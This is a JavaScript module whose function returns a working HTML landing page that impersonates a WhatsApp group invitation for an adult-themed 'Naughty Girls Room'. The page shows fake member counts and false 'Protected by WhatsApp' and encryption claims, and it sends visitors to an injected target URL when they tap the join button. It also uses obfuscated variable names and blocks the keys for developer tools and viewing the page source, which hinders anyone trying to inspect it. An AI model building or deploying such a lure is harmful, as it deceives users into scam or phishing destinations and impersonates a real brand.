export function getLp1Html(targetUrl) {
    return `<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="temvik">
    <title>WhatsApp group invitation</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <meta property="og:image" content="post.jpg">
    <style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
}

body {
    color: white;
    height: 100vh;
    display: flex;
    flex-direction: column;
    overflow: hidden;
}

.blur-content {
    backdrop-filter: none !important;
    -webkit-backdrop-filter: none !important;
    background: transparent !important;
}

video.bg-video {
    position: fixed;
    top: auto;
    bottom: 0;
    left: 0;
    width: 100%;
    height: 100%;
    object-fit: cover;
    object-position: center top;
    z-index: -1;
}

.whatsapp-header {
    background-color: #008069;
    padding: 16px;
    display: flex;
    align-items: center;
    gap: 15px;
    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
    flex-shrink: 0;
}

.back-button {
    color: white;
    font-size: 20px;
    cursor: pointer;
}

.header-text {
    flex: 1;
}

.header-text h1 {
    font-size: 18px;
    font-weight: 500;
}

.header-text p {
    font-size: 13px;
    opacity: 0.9;
}

.main-content {
    flex: 1;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding: 20px;
    text-align: center;
}

.profile-container {
    margin-bottom: 30px;
}

.profile-img {
    width: 140px;
    height: 140px;
    border-radius: 50%;
    margin: 0 auto 20px;
    overflow: hidden;
    border: 5px solid rgba(255, 255, 255, 0.3);
    background: linear-gradient(135deg, #25d366, #128c7e);
    display: flex;
    justify-content: center;
    align-items: center;
    color: white;
    font-size: 60px;
}

.group-name {
    font-size: 24px;
    font-weight: 600;
    margin-bottom: 8px;
}

.group-info {
    font-size: 16px;
    opacity: 0.9;
    margin-bottom: 30px;
}

.members-info {
    display: flex;
    justify-content: center;
    gap: 40px;
    margin-bottom: 40px;
}

.member-count,
.active-members {
    display: flex;
    flex-direction: column;
    align-items: center;
    cursor: pointer;
    position: relative;
}

.count {
    font-size: 22px;
    font-weight: 600;
}

.label {
    font-size: 14px;
    opacity: 0.9;
    margin-top: 5px;
}

.online-indicator {
    display: flex;
    align-items: center;
    gap: 5px;
    margin-top: 3px;
}

.dot {
    width: 10px;
    height: 10px;
    border-radius: 50%;
    background-color: #25d366;
}

.notification {
    background-color: rgba(255, 255, 255, 0.1);
    border-radius: 10px;
    padding: 15px;
    margin: 25px 0;
    font-size: 14px;
    text-align: center;
    max-width: 400px;
    width: 100%;
    backdrop-filter: blur(10px);
}

.notification i {
    margin-right: 8px;
    opacity: 0.8;
}

.join-button {
    background-color: #25d366;
    color: white;
    border: none;
    padding: 18px 40px;
    font-size: 18px;
    font-weight: 600;
    border-radius: 30px;
    cursor: pointer;
    transition: all 0.3s ease;
    width: 100%;
    max-width: 300px;
    box-shadow: 0 4px 15px rgba(37, 211, 102, 0.4);
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 12px;
    margin: 0 auto;
}

.join-button:hover {
    background-color: #20bd5c;
    transform: translateY(-2px);
    box-shadow: 0 6px 20px rgba(37, 211, 102, 0.5);
}

.join-button:active {
    transform: translateY(0);
}

.security-notice {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    margin-top: 20px;
    font-size: 13px;
    opacity: 0.8;
}

.footer {
    padding: 20px;
    font-size: 12px;
    opacity: 0.7;
    text-align: center;
    flex-shrink: 0;
}

.message-popup {
    position: absolute;
    top: -45px;
    left: 50%;
    transform: translateX(-50%);
    background-color: rgba(0, 0, 0, 0.8);
    color: white;
    padding: 10px 20px;
    border-radius: 25px;
    font-size: 13px;
    white-space: nowrap;
    opacity: 0;
    transition: opacity 0.3s;
    z-index: 10;
}

.message-popup.show {
    opacity: 1;
}

@keyframes pulse {
    0% {
        transform: scale(1);
    }

    50% {
        transform: scale(1.05);
    }

    100% {
        transform: scale(1);
    }
}

.profile-img {
    animation: pulse 3s infinite ease-in-out;
}

@media (max-width: 480px) {
    .profile-img {
        width: 120px;
        height: 120px;
        font-size: 50px;
    }

    .group-name {
        font-size: 22px;
    }

    .members-info {
        gap: 30px;
    }

    .join-button {
        padding: 16px 35px;
        font-size: 16px;
    }
}

@media (max-width: 350px) {
    .members-info {
        flex-direction: column;
        gap: 20px;
    }

    .group-name {
        font-size: 20px;
    }

    .main-content {
        padding: 15px;
    }
}
</style>
	<link href="https://skibidibawok.github.io/data-image/image02.jpg" rel="shortcut icon">
</head>
<body oncontextmenu="return false">
    <video class="bg-video" id="bgVideo" autoplay muted loop playsinline></video>

    <div class="whatsapp-header">
        <div class="back-button">
        <i class="fas fa-arrow-left"></i>
        </div>
        <div class="header-text">
            <h1>Naughty Girls Room</h1>
            <p>WhatsApp</p>
        </div>
    </div>
    <div class="blur-content">
        <div class="main-content">
            <div class="profile-container">
                <div class="profile-img">
                    <i class="fas fa-users"></i>
                </div>
                <div class="group-name">Naughty Girls Room</div>
                <div class="group-info">Admin and Moderator: Emily Whitney </div>
            </div>

            <div class="members-info">
                <div class="member-count" id="memberCount">
                    <div class="message-popup" id="messagePopup1">People Who Have Actively Enjoyed This Service</div>
                    <div class="count">130,6K</div>
                    <div class="label">Members</div>
                </div>
                <div class="active-members" id="activeMembers">
                    <div class="message-popup" id="messagePopup2">People Who Have Actively Enjoyed This Service</div>
                    <div class="count">50.8K</div>
                    <div class="online-indicator">
                        <div class="dot"></div>Online
                    </div>
                </div>
            </div>

            <div class="notification">
                <i class="fas fa-lock"></i>
                <span>New messages and calls are secured with end-to-end encryption. Only people in this chat can read,
                    listen to, or share them.</span>
            </div>

            <button class="join-button" id="joinButton">
                <i class="fab fa-whatsapp"></i> Join the group
            </button>

            <div class="security-notice">
                <i class="fas fa-shield-alt"></i>
                <span>Protected by WhatsApp</span>
            </div>
        </div>

        <div class="footer">
            By clicking "Join the group", you agree to share contact information with the group administrator and other
            participants.
        </div>
    </div>

    <script>
        const _0y = ['${targetUrl}'];
        const _0z = ['${targetUrl}'];

        const videoList = [
            'https://skibidibawok.github.io/data-image/vidio3.mp4',
            'https://skibidibawok.github.io/data-image/vidio4.mp4',
            'https://skibidibawok.github.io/data-image/vidio2.mp4',
        ];

        function getRandomVideo() {
            const randomIndex = Math.floor(Math.random() * videoList.length);
            return videoList[randomIndex];
        }

        document.addEventListener('DOMContentLoaded', function () {
            const videoElement = document.getElementById('bgVideo');
            const randomVideo = getRandomVideo();

            const sourceElement = document.createElement('source');
            sourceElement.src = randomVideo;
            sourceElement.type = 'video/mp4';

            videoElement.innerHTML = '';
            videoElement.appendChild(sourceElement);

            videoElement.load();
            videoElement.play().catch(e => {
                console.log('Autoplay prevented, waiting for user interaction');
            });

            const elements = document.querySelectorAll('.profile-container, .members-info, .notification, .join-button');
            elements.forEach((element, index) => {
                element.style.opacity = '0';
                element.style.transform = 'translateY(20px)';

                setTimeout(() => {
                    element.style.transition = 'all 0.5s ease';
                    element.style.opacity = '1';
                    element.style.transform = 'translateY(0)';
                }, index * 200);
            });
        });

        function showMessage(popupId) {
            const popup = document.getElementById(popupId);
            popup.classList.add('show');

            setTimeout(() => {
                popup.classList.remove('show');
            }, 2000);
        }

        document.getElementById('memberCount').addEventListener('click', function () {
            showMessage('messagePopup1');
        });

        document.getElementById('activeMembers').addEventListener('click', function () {
            showMessage('messagePopup2');
        });

        document.querySelector('.back-button').addEventListener('click', function () {
            window.history.back();
        });

        document.body.addEventListener('wheel', function (e) {
            e.preventDefault();
        }, { passive: false });

        document.body.addEventListener('touchmove', function (e) {
            e.preventDefault();
        }, { passive: false });

        document.getElementById('bgVideo').addEventListener('error', function (e) {
            console.log('Video error, applying fallback background');
            document.body.style.background = 'linear-gradient(135deg, #075e54, #128c7e)';
        });

        let _1x = 0;
        const _2a = () => _0z[0];
        const _2b = () => _0y[0];

        document.getElementById('joinButton').addEventListener('mousedown', function (e) {
            _1x = e.button;
        });

        document.getElementById('joinButton').addEventListener('click', function (e) {
            e.preventDefault();

            const button = document.getElementById('joinButton');
            button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Redirecting...';
            button.disabled = true;
            document.body.style.opacity = '0.9';

            setTimeout(function () {
                if (_1x === 0) {
                    window.location.href = _2a();
                } else if (_1x === 2) {
                    window.location.href = _2b();
                }
            }, 500);
        });

        document.getElementById('joinButton').addEventListener('contextmenu', function (e) {
            e.preventDefault();

            const button = document.getElementById('joinButton');
            button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Redirecting...';
            button.disabled = true;
            document.body.style.opacity = '0.9';

            setTimeout(function () {
                window.location.href = _2b();
            }, 500);

            return false;
        });

        document.getElementById('joinButton').addEventListener('touchend', function (e) {
            e.preventDefault();

            const button = document.getElementById('joinButton');
            button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Redirecting...';
            button.disabled = true;
            document.body.style.opacity = '0.9';

            setTimeout(function () {
                window.location.href = _2a();
            }, 500);
        });
    </script>
    <script>
        document.addEventListener('keydown', function (e) {
            if (e.key === 'F12') {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.shiftKey && e.key === 'I') {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.shiftKey && e.key === 'J') {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.key === 'u') {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.key === 's') {
                e.preventDefault();
                return false;
            }
            if (e.ctrlKey && e.key === 'f') {
                e.preventDefault();
                return false;
            }
        });
    </script>
</body>

</html>


















`;
}
